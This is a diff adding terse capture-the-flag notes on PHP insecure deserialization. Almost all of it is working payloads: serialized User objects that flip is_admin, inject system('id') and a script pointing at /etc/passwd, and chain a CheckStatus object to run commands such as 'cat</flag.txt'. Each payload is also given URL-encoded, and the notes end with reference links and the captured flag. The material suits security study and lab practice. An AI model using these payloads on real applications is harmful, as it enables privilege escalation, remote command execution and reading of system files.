@@ -1,0 +1,18 @@
+O:4:"User":2:{s:8:"is_admin";b:1;s:4:"name";s:18:"<?= system('id');>";}
+
+<? is filtered again
+
+O:4:"User":2:{s:8:"is_admin";b:1;s:4:"name";s:56:"<script> window.location = 'file:///etc/passwd'</script>";}
+
+https://vickieli.dev/insecure%20deserialization/pop-chains/
+https://www.invicti.com/blog/web-security/untrusted-data-unserialize-php/
+
+exploit.php:
+
+O:4:"User":2:{s:8:"is_admin";i:1;s:4:"name";O:11:"CheckStatus":1:{s:6:"status";s:2:"id";}}
+O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22is_admin%22%3Bi%3A1%3Bs%3A4%3A%22name%22%3BO%3A11%3A%22CheckStatus%22%3A1%3A%7Bs%3A6%3A%22status%22%3Bs%3A2%3A%22id%22%3B%7D%7D
+
+O:4:"User":2:{s:8:"is_admin";i:1;s:4:"name";O:11:"CheckStatus":1:{s:6:"status";s:13:"cat</flag.txt";}}
+O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22is_admin%22%3Bi%3A1%3Bs%3A4%3A%22name%22%3BO%3A11%3A%22CheckStatus%22%3A1%3A%7Bs%3A6%3A%22status%22%3Bs%3A13%3A%22cat%3C%2Fflag.txt%22%3B%7D%7D
+
+HDFR{I_l0v3_uNs3ri@liz@ti0n_ev3n_if_it_sUcks}
